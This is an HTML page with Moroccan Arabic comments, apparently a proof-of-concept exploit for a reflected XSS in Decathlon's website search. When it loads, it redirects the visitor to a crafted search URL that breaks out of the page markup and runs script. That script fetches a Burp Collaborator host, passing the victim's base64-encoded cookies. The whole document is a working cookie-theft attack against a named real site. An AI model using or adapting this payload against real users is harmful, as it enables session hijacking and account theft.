<!DOCTYPE html>
<html>
<body onload="launchAttack()">
    <script>
        function launchAttack() {
            // الرابط ديالك فـ Burp Collaborator
            var collab = "bq5fhfaet10n0yflkr53beqvbmhd58tx.oastify.com";
            
            // الـ Payload اللي غايتنفذ وسط ديكاثلون (مشر بالـ Base64 باش ما يتكشفش)
            // هاد الكود كيهز الكوكيز ويصيفطهم لـ Burp
            var payload = "fetch('https://" + collab + "/?exfil=' + btoa(document.cookie))";
            
            // الرابط الملعون ديال Decathlon مع الـ XSS اللي لقيتي
            // استعملنا </h1></title> باش نهربو من السجن ديال الكود
            var targetUrl = "https://www.decathlon.com/search?q=</h1></title><script>" + payload + "<\/script>";

            // توجيه الضحية للرابط أوتوماتيكياً
            window.location.href = targetUrl;
        }
    </script>
</body>
</html>
